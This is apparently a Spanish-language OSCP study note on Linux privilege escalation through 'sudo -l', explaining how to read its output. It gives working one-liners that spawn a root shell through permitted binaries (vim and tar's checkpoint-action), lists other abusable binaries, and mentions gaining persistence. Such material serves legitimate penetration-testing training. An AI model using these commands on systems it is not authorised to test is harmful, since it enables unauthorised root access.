`sudo -l` es uno de los primeros comandos que debes ejecutar al comprometer un sistema Linux. Permite listar los comandos que el usuario actual puede ejecutar con privilegios elevados. Muchas escaladas en OSCP vienen directamente de aquí.

---

## Comando Básico

```bash
sudo -l
```

Si no pide contraseña o acepta la tuya, mostrará los comandos permitidos.

---

## Interpretación de Salida

### Sin contraseña:
```
(ALL) NOPASSWD: /usr/bin/vim
```
Puedes ejecutar `vim` como root sin contraseña:
```bash
sudo vim -c '!bash'
```

### Con contraseña:
```
(ALL : ALL) ALL
```
Puedes usar `sudo` para cualquier cosa si sabes la contraseña (más raro en OSCP, pero posible en máquinas personalizadas).

---

## Ataques típicos según binario

Si ves que puedes ejecutar alguno de estos binarios como root, revisa su entrada en [GTFOBins](https://gtfobins.github.io):

- `vim`, `less`, `nano`, `find`, `awk`, `perl`, `python`, `tar`, `cp`, `bash`, `man`, etc.

Ejemplo:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## Casos de Uso OSCP

- Escalar a root usando un binario con `NOPASSWD`
- Escapar restricciones de shell usando un binario permitido
- Ganar persistencia si puedes lanzar scripts como root

---

## Buenas Prácticas

- Ejecuta `sudo -l` inmediatamente tras `id` y `whoami`
- Si ves `env_reset` o `secure_path`, ten cuidado con variables de entorno
- Usa GTFOBins para cada binario sospechoso

---
